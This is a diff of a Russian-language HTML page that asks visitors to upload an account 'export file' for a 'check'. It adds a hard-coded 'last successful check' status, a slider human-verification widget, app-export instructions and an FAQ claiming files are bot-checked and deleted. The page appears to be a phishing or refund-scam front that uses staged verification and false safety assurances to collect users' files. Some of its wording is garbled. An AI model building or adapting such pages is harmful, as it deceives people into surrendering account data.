@@ -17,8 +17,18 @@
         </div>
         
         <!-- Приветствие -->
-        <div class="greeting" id="greeting">
-            Привет, <span id="userName">Пользователь</span>!
+        <div class="greeting">
+            Привет, <span id="userName" style="color: #667eea; font-weight: 600;">Пользователь</span>!
+            <div class="greeting-text">
+                Загрузите файл экспорта для проверки
+            </div>
+        </div>
+        
+        <!-- Статус проверки -->
+        <div class="check-status">
+            <div class="status-text">
+                Последняя успешная проверка: сегодня в 18:04
+            </div>
         </div>
         
         <!-- Кнопка отправки файла -->
@@ -26,8 +36,15 @@
             📎 Отправить файл
         </button>
         
+        <!-- Блок загрузки файла -->
+        <div class="file-upload" id="fileUpload" style="display: none;">
+            <div class="upload-icon">📁</div>
+            <div class="upload-text">Загрузить файл</div>
+            <div class="upload-subtext">Несмотря на данные заверения</div>
+        </div>
+        
         <!-- Слайдер для проверки на человека -->
-        <div class="captcha-container" id="captchaContainer">
+        <div class="captcha-container" id="captchaContainer" style="display: none;">
             <div class="captcha-text">Передвиньте ползунок вправо для подтверждения</div>
             <div class="slider-container">
                 <div class="slider-track">
@@ -37,6 +54,9 @@
                 </div>
             </div>
         </div>
+        
+        <!-- Сообщение об успешной отправке -->
+        <div class="success-message" id="successMessage" style="display: none;"></div>
         
         <!-- Нижние кнопки -->
         <div class="bottom-buttons">
@@ -48,7 +68,7 @@
             </button>
         </div>
         
-        <!-- Модальные окна -->
+        <!-- Модальное окно Инструкция -->
         <div class="modal" id="instructionModal">
             <div class="modal-content">
                 <div class="modal-header">
@@ -56,7 +76,7 @@
                     <span class="close-btn" id="closeInstruction">&times;</span>
                 </div>
                 <div class="modal-body">
-                    <ol>
+                    <ol class="instruction-list">
                         <li>Скачайте приложение Искорёжки с официального сайта...</li>
                         <li>Откройте Искорёжки и войдите в свой аккаунт.</li>
                         <li>Зайдите в настройки и выберите пункт «Искорёжки».</li>
@@ -70,6 +90,7 @@
             </div>
         </div>
         
+        <!-- Модальное окно FAQ -->
         <div class="modal" id="faqModal">
             <div class="modal-content">
                 <div class="modal-header">
@@ -81,12 +102,12 @@
                         <h3>Что такое рефлексия?</h3>
                         <p>Это возврат средств за подарок...</p>
                     </div>
-                    <hr>
+                    <div class="divider"></div>
                     <div class="faq-section">
                         <h3>Сколько времени занимает проверка?</h3>
                         <p>Обычно 3-5 минут, бывают задержки.</p>
                     </div>
-                    <hr>
+                    <div class="divider"></div>
                     <div class="faq-section">
                         <h3>Мои файлы в безопасности?</h3>
                         <p>Да – мы не храним ваши файлы, их проверяет наш бот, после чего удаляет.</p>
